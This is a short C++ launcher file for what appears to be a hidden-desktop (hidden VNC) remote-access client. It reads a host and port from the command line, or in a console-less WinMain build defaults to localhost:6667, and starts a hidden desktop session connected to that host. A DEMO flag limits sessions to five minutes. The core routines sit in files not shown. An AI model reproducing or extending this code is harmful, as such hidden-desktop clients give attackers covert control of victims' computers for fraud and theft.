#include "HiddenDesktop.h"

//#define DEMO
#ifdef DEMO
#define TIMEOUT (5 * 1000 * 60) //  minutes
#else
#define TIMEOUT INFINITE
#endif




void StartAndWait(const char *host, int port)
{
    InitApi();
    const HANDLE hThread = StartHiddenDesktop(host, port);
    WaitForSingleObject(hThread, TIMEOUT);
}

#if 1
int main(int argc, char* argv[])
{
	
		
	
    if (argc < 3)
    {
        puts("ERROR: Missing host and port!");
        return -1;
    }
    const char* host = argv[1];
    const int port = strtol(argv[2], nullptr, 10);
    printf("Connecting to %s:%d...\n", host, port);
#ifdef DEMO
    printf("DEMO is limited to %d seconds\n", TIMEOUT / 1000);
#endif
    StartAndWait(host, port);
#ifdef DEMO
    puts("DEMO is over...");
#endif
    return 0;
}
#else
int CALLBACK WinMain(HINSTANCE hInstance,
    HINSTANCE hPrevInstance,
    LPSTR lpCmdLine,
    int nCmdShow)
{
    /*
       AllocConsole();

       freopen_s("CONIN$", "r", stdin);
       freopen_s("CONOUT$", "w", stdout);
       freopen_s("CONOUT$", "w", stderr);

       SetConsoleTitle(TEXT("Hidden Desktop Client"));
    */
    StartAndWait("localhost", 6667); // TODO command line options
    return 0;
}
#endif